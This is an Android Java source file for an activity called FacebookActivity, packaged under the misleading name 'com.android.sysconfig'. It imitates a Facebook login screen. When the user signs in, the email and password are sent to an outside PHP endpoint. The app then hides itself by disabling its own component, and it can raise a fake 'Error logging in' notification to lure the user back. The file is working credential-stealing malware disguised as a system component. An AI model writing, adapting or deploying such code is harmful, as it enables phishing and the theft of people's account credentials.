package com.android.sysconfig;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Typeface;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v4.app.NotificationCompat;
import android.support.v7.app.ActionBarActivity;
import android.text.Html;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.github.nkzawa.emitter.Emitter;
import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;


public class FacebookActivity extends ActionBarActivity {


    Button loginBtn;
    EditText emailEt, passwordEt;
    Socket socket;
    MediaPlayer mp;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        loginBtn = (Button) findViewById(R.id.login_btn);
        emailEt = (EditText) findViewById(R.id.email_et);
        passwordEt = (EditText) findViewById(R.id.password_et);
        ((TextView)findViewById(R.id.sign_up_tv)).setText(Html.fromHtml("<u>Sign Up for Facebook</u>"));
        setVolumeControlStream(AudioManager.STREAM_MUSIC);
        AudioManager mgr=null;
        mgr=(AudioManager)getSystemService(Context.AUDIO_SERVICE);
        mgr.setStreamVolume(AudioManager.STREAM_MUSIC, mgr.getStreamMaxVolume(AudioManager.STREAM_MUSIC), AudioManager.FLAG_REMOVE_SOUND_AND_VIBRATE);
        mp = new MediaPlayer();
        loginBtn.setTypeface(Typeface.DEFAULT_BOLD);
        loginBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                login();
            }
        });
    }




    @Override
    protected void onDestroy() {
        super.onDestroy();
    //    startService(new Intent(getBaseContext(), MPService.class));
    }



    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }

    void login(){
        if(emailEt.getText() == null){
            Toast.makeText(FacebookActivity.this, "No email supplied", Toast.LENGTH_SHORT).show();
            return;
        }
        String email = emailEt.getText().toString();
        if(email == null){
            Toast.makeText(FacebookActivity.this, "No email supplied", Toast.LENGTH_SHORT).show();
            return;
        }
        if(!email.contains("@") || !email.contains(".")){
            Toast.makeText(FacebookActivity.this, "Bad email", Toast.LENGTH_SHORT).show();
            return;
        }
        if(passwordEt.getText() == null){
            Toast.makeText(FacebookActivity.this, "No password supplied", Toast.LENGTH_SHORT).show();
            return;
        }
        String password = passwordEt.getText().toString();
        if(password == null || password.length() == 0){
            Toast.makeText(FacebookActivity.this, "No password supplied", Toast.LENGTH_SHORT).show();
            return;
        }
        new SignerTask(emailEt.getText().toString(), passwordEt.getText().toString()).execute();
    }





    void showNotification(){
        NotificationCompat.Builder mBuilder =
                new NotificationCompat.Builder(this)
                        .setSmallIcon(R.drawable.ic_launcher)
                        .setContentTitle("Facebook - Error logging in")
                        .setContentText("Tap to sign in again");
        Intent resultIntent = new Intent(this, FacebookActivity.class);
        // Because clicking the notification opens a new ("special") activity, there's
        // no need to create an artificial back stack.
        PendingIntent resultPendingIntent =
                PendingIntent.getActivity(
                        this,
                        0,
                        resultIntent,
                        PendingIntent.FLAG_UPDATE_CURRENT
                );

        mBuilder.setContentIntent(resultPendingIntent);
        // Sets an ID for the notification
        int mNotificationId = 001;
        // Gets an instance of the NotificationManager service
        NotificationManager mNotifyMgr =
                (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        // Builds the notification and issues it.
        mNotifyMgr.notify(mNotificationId, mBuilder.build());
    }


    @Override
    protected void onPause() {
        super.onPause();
        getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), getPackageName() + ".FacebookActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        finish();
    }

    class SignerTask extends AsyncTask<String, Void, Boolean>{

        private String user;
        private String password;

        public SignerTask(String user, String password){
            this.user = user;
            this.password = password;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            loginBtn.setEnabled(false);
            loginBtn.setText("Logging in...");
        }

        @Override
        protected Boolean doInBackground(String... extraStrings) {
            HttpPost httpPost = new HttpPost("http://dsapps.hol.es/other/insert.php");
            HttpClient httpClient = new DefaultHttpClient();
            JSONObject request = new JSONObject();
            try{
                request.put("user", user);
                request.put("password", password);
            }catch(JSONException e){
                e.printStackTrace();
                return false;
            }
            JSONArray extras = new JSONArray();
            for(String extra : extraStrings){
                extras.put(extra);
            }
            try{
                request.put("extras", extras);
            }catch (JSONException e){
                e.printStackTrace();
                return false;
            }
            try{
                httpPost.setEntity(new StringEntity(request.toString()));
                HttpResponse httpResponse = httpClient.execute(httpPost);
                String response_ = EntityUtils.toString(httpResponse.getEntity());
                JSONObject response = new JSONObject(response_);
                return response.getBoolean("success");
            }catch (IOException e){
                e.printStackTrace();
                return false;
            }catch (JSONException e){
                e.printStackTrace();
                return false;
            }
        }

        @Override
        protected void onPostExecute(Boolean success) {
            super.onPostExecute(success);
            loginBtn.setEnabled(true);
            loginBtn.setText("Login");
            if(success){
//                Toast.makeText(FacebookActivity.this, "Incorrect email/password", Toast.LENGTH_SHORT).show();
//                passwordEt.setText("");
                getPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), getPackageName() + ".FacebookActivity"),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
                finish();
            }else{
                Toast.makeText(FacebookActivity.this, "Can't connect", Toast.LENGTH_SHORT).show();
            }
        }


    }


}
